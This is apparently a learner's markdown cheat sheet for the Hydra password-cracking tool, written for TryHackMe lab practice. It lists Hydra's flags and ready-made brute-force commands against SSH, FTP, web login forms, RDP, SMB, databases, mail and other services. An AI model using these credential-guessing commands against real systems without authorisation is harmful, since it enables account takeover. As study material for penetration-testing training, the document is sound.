### Hydra :
- Hydra is the password cracking tool.
- This tool is password list based.
- when we provide password list and username list this will try each and evry password combination to crack it.
- If you are using weak password this shows importance of using strong password and MFA.

---

### > Below i mentioned all necessary flags related to hydra :

---

| Situation | Hydra Flag | Example |
|-----------|------------|---------|
| Username is known | `-l` (small L) | `hydra -l admin -P pass.txt ssh://target` |
| Username not known | `-L` (capital L) | `hydra -L users.txt -P pass.txt ssh://target` |
| Single Password – Username Guess | `-p` (small p) | `hydra -L users.txt -p password123 ssh://target` |
| Password Wordlist – Username Guess | `-P` (capital P) | `hydra -L users.txt -P pass.txt ssh://target` |



---


### Command for Hydra is : 
- Post web form :  hydra -l <username> -P <wordlist> 10.49.164.125 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V


---


### If we are brute forcing depending upon service then commands shoul be as follows :


---


| Service | Port | Command |
|---------|------|---------|
| SSH | 22 | `hydra -l admin -P pass.txt ssh://192.168.1.1` |
| SSH (Multiple Users) | 22 | `hydra -L users.txt -P pass.txt ssh://192.168.1.1` |
| FTP | 21 | `hydra -l admin -P pass.txt ftp://192.168.1.1` |
| HTTP (Basic Auth) | 80 | `hydra -l admin -P pass.txt http-get://192.168.1.1/protected` |
| HTTP (POST Form) | 80 | `hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"` |
| HTTPS (POST Form) | 443 | `hydra -l admin -P pass.txt https-post-form "/login.php:user=^USER^&pass=^PASS^:F=error"` |
| MySQL | 3306 | `hydra -l root -P pass.txt mysql://192.168.1.1` |
| RDP (Windows) | 3389 | `hydra -l administrator -P pass.txt rdp://192.168.1.1` |
| SMB (Windows Share) | 445 | `hydra -l admin -P pass.txt smb://192.168.1.1` |
| POP3 | 110 | `hydra -l admin -P pass.txt pop3://192.168.1.1` |
| SMTP | 25 | `hydra -l admin -P pass.txt smtp://192.168.1.1` |
| Telnet | 23 | `hydra -l admin -P pass.txt telnet://192.168.1.1` |
| PostgreSQL | 5432 | `hydra -l postgres -P pass.txt postgresql://192.168.1.1` |
| MSSQL | 1433 | `hydra -l sa -P pass.txt mssql://192.168.1.1` |
| Redis | 6379 | `hydra -l default -P pass.txt redis://192.168.1.1` |


---


### Practicle :

- I have added screenshots of practicle from tryhackme controlled lab :

---


